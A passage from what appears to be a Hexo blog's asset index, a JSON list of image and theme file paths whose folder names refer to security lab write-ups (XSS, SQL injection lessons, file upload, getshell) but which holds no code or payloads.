/Stored/low_004.png","path":"img/xss/dvwa/Stored/low_004.png","modified":0,"renderable":0},{"_id":"source/img/xss/dvwa/Stored/medium_002.png","path":"img/xss/dvwa/Stored/medium_002.png","modified":0,"renderable":0},{"_id":"source/img/xss/dvwa/Stored/medium_003.png","path":"img/xss/dvwa/Stored/medium_003.png","modified":0,"renderable":0},{"_id":"source/img/xss/dvwa/Stored/medium_004.png","path":"img/xss/dvwa/Stored/medium_004.png","modified":0,"renderable":0},{"_id":"source/img/xss/dvwa/Stored/medium_005.png","path":"img/xss/dvwa/Stored/medium_005.png","modified":0,"renderable":0},{"_id":"source/img/xss/dvwa/Stored/medium_006.png","path":"img/xss/dvwa/Stored/medium_006.png","modified":0,"renderable":0},{"_id":"source/img/xss/haozi/004.png","path":"img/xss/haozi/004.png","modified":0,"renderable":0},{"_id":"source/img/xss/haozi/005.png","path":"img/xss/haozi/005.png","modified":0,"renderable":0},{"_id":"source/img/xss/haozi/006.png","path":"img/xss/haozi/006.png","modified":0,"renderable":0},{"_id":"source/img/xss/haozi/007.png","path":"img/xss/haozi/007.png","modified":0,"renderable":0},{"_id":"source/img/xss/haozi/009.png","path":"img/xss/haozi/009.png","modified":0,"renderable":0},{"_id":"source/img/xss/haozi/008.png","path":"img/xss/haozi/008.png","modified":0,"renderable":0},{"_id":"source/img/xss/haozi/00D.png","path":"img/xss/haozi/00D.png","modified":0,"renderable":0},{"_id":"source/img/xss/haozi/00E.png","path":"img/xss/haozi/00E.png","modified":0,"renderable":0},{"_id":"source/img/xss/haozi/010.png","path":"img/xss/haozi/010.png","modified":0,"renderable":0},{"_id":"source/img/xss/haozi/012.png","path":"img/xss/haozi/012.png","modified":0,"renderable":0},{"_id":"themes/next/source/js/src/schemes/pisces.js","path":"js/src/schemes/pisces.js","modified":0,"renderable":1},{"_id":"themes/next/source/lib/font-awesome/css/font-awesome.css","path":"lib/font-awesome/css/font-awesome.css","modified":0,"renderable":1},{"_id":"themes/next/source/lib/font-awesome/css/font-awesome.css.map","path":"lib/font-awesome/css/font-awesome.css.map","modified":0,"renderable":1},{"_id":"themes/next/source/lib/font-awesome/css/font-awesome.min.css","path":"lib/font-awesome/css/font-awesome.min.css","modified":0,"renderable":1},{"_id":"themes/next/source/lib/ua-parser-js/dist/ua-parser.min.js","path":"lib/ua-parser-js/dist/ua-parser.min.js","modified":0,"renderable":1},{"_id":"themes/next/source/lib/ua-parser-js/dist/ua-parser.pack.js","path":"lib/ua-parser-js/dist/ua-parser.pack.js","modified":0,"renderable":1},{"_id":"source/img/cms/MetInfo/Getshell/3.png","path":"img/cms/MetInfo/Getshell/3.png","modified":0,"renderable":0},{"_id":"source/img/fileupload/upload-labs/007_6.png","path":"img/fileupload/upload-labs/007_6.png","modified":0,"renderable":0},{"_id":"source/img/fileupload/upload-labs/013_3.png","path":"img/fileupload/upload-labs/013_3.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-11/12.png","path":"img/sql/Lesson-11/12.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-11/6.png","path":"img/sql/Lesson-11/6.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-11/8.png","path":"img/sql/Lesson-11/8.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-11/9.png","path":"img/sql/Lesson-11/9.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-13/5.png","path":"img/sql/Lesson-13/5.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-13/8.png","path":"img/sql/Lesson-13/8.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-13/9.png","path":"img/sql/Lesson-13/9.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-14/1.png","path":"img/sql/Lesson-14/1.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-14/2.png","path":"img/sql/Lesson-14/2.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-18/7.png","path":"img/sql/Lesson-18/7.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-18/8.png","path":"img/sql/Lesson-18/8.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-19/3.png","path":"img/sql/Lesson-19/3.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-19/4.png","path":"img/sql/Lesson-19/4.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-20/13.png","path":"img/sql/Lesson-20/13.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-20/9.png","path":"img/sql/Lesson-20/9.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-21/005.png","path":"img/sql/Lesson-21/005.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-22/002.png","path":"img/sql/Lesson-22/002.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-23/001.png","path":"img/sql/Lesson-23/001.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-23/003.png","path":"img/sql/Lesson-23/003.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-23/005.png","path":"img/sql/Lesson-23/005.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-23/007.png","path":"img/sql/Lesson-23/007.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-23/004.png","path":"img/sql/Lesson-23/004.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-24/005.png","path":"img/sql/Lesson-24/005.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-29/003.png","path":"img/sql/Lesson-29/003.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-32/001.png","path":"img/sql/Lesson-32/001.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-32/008.png","path":"img/sql/Lesson-32/008.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-32/009.png","path":"img/sql/Lesson-32/009.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-35/001.png","path":"img/sql/Lesson-35/001.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-35/003.png","path":"img/sql/Lesson-35/003.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-35/004.png","path":"img/sql/Lesson-35/004.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-35/005.png","path":"img/sql/Lesson-35/005.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-35/008.png","path":"img/sql/Lesson-35/008.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-36/001.png","path":"img/sql/Lesson-36/001.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-38/007.png","path":"img/sql/Lesson-38/007.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-38/009.png","path":"img/sql/Lesson-38/009.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-38/012.png","path":"img/sql/Lesson-38/012.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-38/013.png","path":"img/sql/Lesson-38/013.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-4/2.png","path":"img/sql/Lesson-4/2.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-4/4.png","path":"img/sql/Lesson-4/4.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-41/001.png","path":"img/sql/Lesson-41/001.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-42/006.png","path":"img/sql/Lesson-42/006.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-43/002.png","path":"img/sql/Lesson-43/002.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-43/004.png","path":"img/sql/Lesson-43/004.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-43/005.png","path":"img/sql/Lesson-43/005.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-43/008.png","path":"img/sql/Lesson-43/008.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-43/009.png","path":"img/sql/Lesson-43/009.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-44/004.png","path":"img/sql/Lesson-44/004.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-44/008.png","path":"img/sql/Lesson-44/008.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-44/009.png","path":"img/sql/Lesson-44/009.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-58/005.png","path":"img/sql/Lesson-58/005.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-6/1.png","path":"img/sql/Lesson-6/1.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-6/6.png","path":"img/sql/Lesson-6/6.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-60/002.png","path":"img/sql/Lesson-60/002.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-61/006.png","path":"img/sql/Lesson-61/006.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-64/004.png","path":"img/sql/Lesson-64/004.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-7/1.png","path":"img/sql/Lesson-7/1.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-7/10.png","path":"img/sql/Lesson-7/10.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-7/2.png","path":"img/sql/Lesson-7/2.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-7/3.png","path":"img/sql/Lesson-7/3.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-7/4.png","path":"img/sql/Lesson-7/4.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-7/6.png","path":"img/sql/Lesson-7/6.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-8/1.png","path":"img/sql/Lesson-8/1.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-8/10.png","path":"img/sql/Lesson-8/10.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-8/11.png","path":"img/sql/Lesson-8/11.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-8/12.png","path":"img/sql/Lesson-8/12.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-8/13.png","path":"img/sql/Lesson-8/13.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-8/14.png","path":"img/sql/Lesson-8/14.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-8/15.png","path":"img/sql/Lesson-8/15.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-8/16.png","path":"img/sql/Lesson-8/16.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-8/17.png","path":"img/sql/Lesson-8/17.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-8/19.png","path":"img/sql/Lesson-8/19.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-8/4.png","path":"img/sql/Lesson-8/4.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-8/5.png","path":"img/sql/Lesson-8/5.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-8/6.png","path":"img/sql/Lesson-8/6.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-8/7.png","path":"img/sql/Lesson-8/7.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-8/8.png","path":"img/sql/Lesson-8/8.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-8/9.png","path":"img/sql/Lesson-8/9.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-9/1.png","path":"img/sql/Lesson-9/1.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-9/4.png","path":"img/sql/Lesson-9/4.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-9/3.png","path":"img/sql/Lesson-9/3.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-9/7.png","path":"img/sql/Lesson-9/7.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-9/8.png","path":"img/sql/Lesson-9/8.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-9/9.png","path":"img/sql/Lesson-9/9.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson3/1.png","path":"img/sql/Lesson3/1.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson3/2.png","path":"img/sql/Lesson3/2.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson3/3.png","path":"img/sql/Lesson3/3.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson3/4.png","path":"img/sql/Lesson3/4.png","modified":0,"renderable":0},{"_id":"source/img/sql/lesson-5/10.png","path":"img/sql/lesson-5/10.png","modified":0,"renderable":0},{"_id":"source/img/sql/lesson-5/3.png","path":"img/sql/lesson-5/3.png","modified":0,"renderable":0},{"_id":"source/img/sql/lesson-5/5.png","path":"img/sql/lesson-5/5.png","modified":0,"renderable":0},{"_id":"source/img/sql/lesson-5/6.png","path":"img/sql/lesson-5/6.png","modified":0,"renderable":0},{"_id":"source/img/sql/lesson-5/7.png","path":"img/sql/lesson-5/7.png","modified":0,"renderable":0},{"_id":"source/img/sql/lesson-5/8.png","path":"img/sql/lesson-5/8.png","modified":0,"renderable":0},{"_id":"source/img/sql/lesson-5/9.png","path":"img/sql/lesson-5/9.png","modified":0,"renderable":0},{"_id":"source/img/sql/lesson2/1.png","path":"img/sql/lesson2/1.png","modified":0,"renderable":0},{"_id":"source/img/sql/lesson2/2.png","path":"img/sql/lesson2/2.png","modified":0,"renderable":0},{"_id":"source/img/sql/lesson2/4.png","path":"img/sql/lesson2/4.png","modified":0,"renderable":0},{"_id":"source/img/tcpdump/9.png","path":"img/tcpdump/9.png","modified":0,"renderable":0},{"_id":"source/img/xss/dvwa/Dom/high_002.png","path":"img/xss/dvwa/Dom/high_002.png","modified":0,"renderable":0},{"_id":"source/img/xss/dvwa/Dom/low_002.png","path":"img/xss/dvwa/Dom/low_002.png","modified":0,"renderable":0},{"_id":"source/img/xss/dvwa/Dom/low_004.png","path":"img/xss/dvwa/Dom/low_004.png","modified":0,"renderable":0},{"_id":"source/img/xss/dvwa/Dom/low_006.png","path":"img/xss/dvwa/Dom/low_006.png","modified":0,"renderable":0},{"_id":"source/img/xss/dvwa/Dom/medium_001.png","path":"img/xss/dvwa/Dom/medium_001.png","modified":0,"renderable":0},{"_id":"source/img/xss/dvwa/Dom/medium_002.png","path":"img/xss/dvwa/Dom/medium_002.png","modified":0,"renderable":0},{"_id":"source/img/xss/dvwa/Dom/medium_004.png","path":"img/xss/dvwa/Dom/medium_004.png","modified":0,"renderable":0},{"_id":"source/img/xss/dvwa/Reflected/high_001.png","path":"img/xss/dvwa/Reflected/high_001.png","modified":0,"renderable":0},{"_id":"source/img/xss/dvwa/Reflected/low_001.png","path":"img/xss/dvwa/Reflected/low_001.png","modified":0,"renderable":0},{"_id":"source/img/xss/dvwa/Stored/high_001.png","path":"img/xss/dvwa/Stored/high_001.png","modified":0,"renderable":0},{"_id":"source/img/xss/dvwa/Stored/impossible_001.png","path":"img/xss/dvwa/Stored/impossible_001.png","modified":0,"renderable":0},{"_id":"source/img/xss/dvwa/Stored/low_001.png","path":"img/xss/dvwa/Stored/low_001.png","modified":0,"renderable":0},{"_id":"source/img/xss/haozi/001.png","path":"img/xss/haozi/001.png","modified":0,"renderable":0},{"_id":"source/img/xss/haozi/003.png","path":"img/xss/haozi/003.png","modified":0,"renderable":0},{"_id":"source/img/xss/haozi/002.png","path":"img/xss/haozi/002.png","modified":0,"renderable":0},{"_id":"source/img/xss/haozi/00A.png","path":"img/xss/haozi/00A.png","modified":0,"renderable":0},{"_id":"source/img/xss/haozi/00B.png","path":"img/xss/haozi/00B.png","modified":0,"renderable":0},{"_id":"source/img/xss/haozi/00C.png","path":"img/xss/haozi/00C.png","modified":0,"renderable":0},{"_id":"source/img/xss/haozi/00F.png","path":"img/xss/haozi/00F.png","modified":0,"renderable":0},{"_id":"source/img/xss/haozi/011.png","path":"img/xss/haozi/011.png","modified":0,"renderable":0},{"_id":"themes/next/source/lib/font-awesome/fonts/fontawesome-webfont.woff2","path":"lib/font-awesome/fonts/fontawesome-webfont.woff2","modified":0,"renderable":1},{"_id":"source/img/Web/20190509/0x01_1.png","path":"img/Web/20190509/0x01_1.png","modified":0,"renderable":0},{"_id":"source/img/Web/20190509/0x03_1.png","path":"img/Web/20190509/0x03_1.png","modified":0,"renderable":0},{"_id":"source/img/Web/20190509/0x05_2.png","path":"img/Web/20190509/0x05_2.png","modified":0,"renderable":0},{"_id":"source/img/cms/MetInfo/Getshell/1.png","path":"img/cms/MetInfo/Getshell/1.png","modified":0,"renderable":0},{"_id":"source/img/cms/MetInfo/Getshell/2.png","path":"img/cms/MetInfo/Getshell/2.png","modified":0,"renderable":0},{"_id":"source/img/cms/MetInfo/Getshell/5.png","path":"img/cms/MetInfo/Getshell/5.png","modified":0,"renderable":0},{"_id":"source/img/cms/MetInfo/Getshell/6.png","path":"img/cms/MetInfo/Getshell/6.png","modified":0,"renderable":0},{"_id":"source/img/csrf/dvwa/medium_005.png","path":"img/csrf/dvwa/medium_005.png","modified":0,"renderable":0},{"_id":"source/img/dedecms/dedecms_V5.7_SP2_sys_info_getshell/003.png","path":"img/dedecms/dedecms_V5.7_SP2_sys_info_getshell/003.png","modified":0,"renderable":0},{"_id":"source/img/fileupload/upload-labs/016_5.png","path":"img/fileupload/upload-labs/016_5.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-10/2.png","path":"img/sql/Lesson-10/2.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-11/11.png","path":"img/sql/Lesson-11/11.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-11/2.png","path":"img/sql/Lesson-11/2.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-11/7.png","path":"img/sql/Lesson-11/7.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-12/4.png","path":"img/sql/Lesson-12/4.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-13/2.png","path":"img/sql/Lesson-13/2.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-13/3.png","path":"img/sql/Lesson-13/3.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-13/4.png","path":"img/sql/Lesson-13/4.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-13/6.png","path":"img/sql/Lesson-13/6.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-13/7.png","path":"img/sql/Lesson-13/7.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-17/12.png","path":"img/sql/Lesson-17/12.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-17/13.png","path":"img/sql/Lesson-17/13.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-19/5.png","path":"img/sql/Lesson-19/5.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-20/10.png","path":"img/sql/Lesson-20/10.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-20/11.png","path":"img/sql/Lesson-20/11.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-20/3.png","path":"img/sql/Lesson-20/3.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-21/001.png","path":"img/sql/Lesson-21/001.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-21/006.png","path":"img/sql/Lesson-21/006.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-21/007.png","path":"img/sql/Lesson-21/007.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-22/001.png","path":"img/sql/Lesson-22/001.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-22/003.png","path":"img/sql/Lesson-22/003.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-23/009.png","path":"img/sql/Lesson-23/009.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-32/006.png","path":"img/sql/Lesson-32/006.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-32/007.png","path":"img/sql/Lesson-32/007.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-33/001.png","path":"img/sql/Lesson-33/001.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-33/004.png","path":"img/sql/Lesson-33/004.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-34/001.png","path":"img/sql/Lesson-34/001.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-34/003.png","path":"img/sql/Lesson-34/003.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-35/006.png","path":"img/sql/Lesson-35/006.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-35/007.png","path":"img/sql/Lesson-35/007.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-35/009.png","path":"img/sql/Lesson-35/009.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-35/010.png","path":"img/sql/Lesson-35/010.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-36/006.png","path":"img/sql/Lesson-36/006.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-36/007.png","path":"img/sql/Lesson-36/007.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-38/001.png","path":"img/sql/Lesson-38/001.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-4/1.png","path":"img/sql/Lesson-4/1.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-40/001.png","path":"img/sql/Lesson-40/001.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-42/002_1.png","path":"img/sql/Lesson-42/002_1.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-43/003.png","path":"img/sql/Lesson-43/003.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-43/006.png","path":"img/sql/Lesson-43/006.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-43/007.png","path":"img/sql/Lesson-43/007.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-55/005.png","path":"img/sql/Lesson-55/005.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-56/006.png","path":"img/sql/Lesson-56/006.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-57/005.png","path":"img/sql/Lesson-57/005.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-58/002.png","path":"img/sql/Lesson-58/002.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-58/003.png","path":"img/sql/Lesson-58/003.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-58/004.png","path":"img/sql/Lesson-58/004.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-59/005.png","path":"img/sql/Lesson-59/005.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-60/001.png","path":"img/sql/Lesson-60/001.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-60/003.png","path":"img/sql/Lesson-60/003.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-60/004.png","path":"img/sql/Lesson-60/004.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-60/005.png","path":"img/sql/Lesson-60/005.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-61/002.png","path":"img/sql/Lesson-61/002.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-61/003.png","path":"img/sql/Lesson-61/003.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-61/004.png","path":"img/sql/Lesson-61/004.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-61/005.png","path":"img/sql/Lesson-61/005.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-8/18.png","path":"img/sql/Lesson-8/18.png","modified":0,"renderable":0},{"_id":"source/img/sql/lesson2/5.png","path":"img/sql/lesson2/5.png","modified":0,"renderable":0},{"_id":"source/img/sql/lesson2/6.png","path":"img/sql/lesson2/6.png","modified":0,"renderable":0},{"_id":"source/img/sql/lesson2/7.png","path":"img/sql/lesson2/7.png","modified":0,"renderable":0},{"_id":"source/img/xss/dvwa/Stored/medium_001.png","path":"img/xss/dvwa/Stored/medium_001.png","modified":0,"renderable":0},{"_id":"themes/next/source/lib/font-awesome/fonts/fontawesome-webfont.woff","path":"lib/font-awesome/fonts/fontawesome-webfont.woff","modified":0,"renderable":1},{"_id":"themes/next/source/lib/velocity/velocity.js","path":"lib/velocity/velocity.js","modified":0,"renderable":1},{"_id":"source/img/cms/MetInfo/Getshell/8.png","path":"img/cms/MetInfo/Getshell/8.png","modified":0,"renderable":0},{"_id":"source/img/csrf/dvwa/low_007.png","path":"img/csrf/dvwa/low_007.png","modified":0,"renderable":0},{"_id":"source/img/fileupload/upload-labs/007_1.png","path":"img/fileupload/upload-labs/007_1.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-17/14.png","path":"img/sql/Lesson-17/14.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-18/10.png","path":"img/sql/Lesson-18/10.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-20/1.png","path":"img/sql/Lesson-20/1.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-28/005.png","path":"img/sql/Lesson-28/005.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-28/006.png","path":"img/sql/Lesson-28/006.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-28/007.png","path":"img/sql/Lesson-28/007.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-31/004.png","path":"img/sql/Lesson-31/004.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-55/004.png","path":"img/sql/Lesson-55/004.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-56/002.png","path":"img/sql/Lesson-56/002.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-56/005.png","path":"img/sql/Lesson-56/005.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-57/003.png","path":"img/sql/Lesson-57/003.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-62/005.png","path":"img/sql/Lesson-62/005.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-63/004.png","path":"img/sql/Lesson-63/004.png","modified":0,"renderable":0},{"_id":"source/img/sql/lesson-5/2.png","path":"img/sql/lesson-5/2.png","modified":0,"renderable":0},{"_id":"source/img/tcpdump/7.png","path":"img/tcpdump/7.png","modified":0,"renderable":0},{"_id":"themes/next/source/lib/font-awesome/fonts/fontawesome-webfont.eot","path":"lib/font-awesome/fonts/fontawesome-webfont.eot","modified":0,"renderable":1},{"_id":"source/fonts/LinBiolinum_Rah.ttf","path":"fonts/LinBiolinum_Rah.ttf","modified":0,"renderable":0},{"_id":"source/img/fileupload/upload-labs/013_2.png","path":"img/fileupload/upload-labs/013_2.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-10/1.png","path":"img/sql/Lesson-10/1.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-17/10.png","path":"img/sql/Lesson-17/10.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-20/6.png","path":"img/sql/Lesson-20/6.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-21/002.png","path":"img/sql/Lesson-21/002.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-23/008.png","path":"img/sql/Lesson-23/008.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-26/005.png","path":"img/sql/Lesson-26/005.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-27a/002.png","path":"img/sql/Lesson-27a/002.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-34/002.png","path":"img/sql/Lesson-34/002.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-44/011.png","path":"img/sql/Lesson-44/011.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-55/003.png","path":"img/sql/Lesson-55/003.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-56/003.png","path":"img/sql/Lesson-56/003.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-56/004.png","path":"img/sql/Lesson-56/004.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-57/002.png","path":"img/sql/Lesson-57/002.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-57/001.png","path":"img/sql/Lesson-57/001.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-57/004.png","path":"img/sql/Lesson-57/004.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-58/001.png","path":"img/sql/Lesson-58/001.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-65/004.png","path":"img/sql/Lesson-65/004.png","modified":0,"renderable":0},{"_id":"source/img/tcpdump/13.png","path":"img/tcpdump/13.png","modified":0,"renderable":0},{"_id":"source/img/xss/dvwa/Stored/low_002.png","path":"img/xss/dvwa/Stored/low_002.png","modified":0,"renderable":0},{"_id":"source/fonts/LinBiolinum_Rah.eot","path":"fonts/LinBiolinum_Rah.eot","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-17/11.png","path":"img/sql/Lesson-17/11.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-25/002.png","path":"img/sql/Lesson-25/002.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-25/003.png","path":"img/sql/Lesson-25/003.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-25/005.png","path":"img/sql/Lesson-25/005.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-25a/003.png","path":"img/sql/Lesson-25a/003.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-26/001.png","path":"img/sql/Lesson-26/001.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-26/003.png","path":"img/sql/Lesson-26/003.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-26/004.png","path":"img/sql/Lesson-26/004.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-26a/001.png","path":"img/sql/Lesson-26a/001.png","modified":0,"renderable":0},{"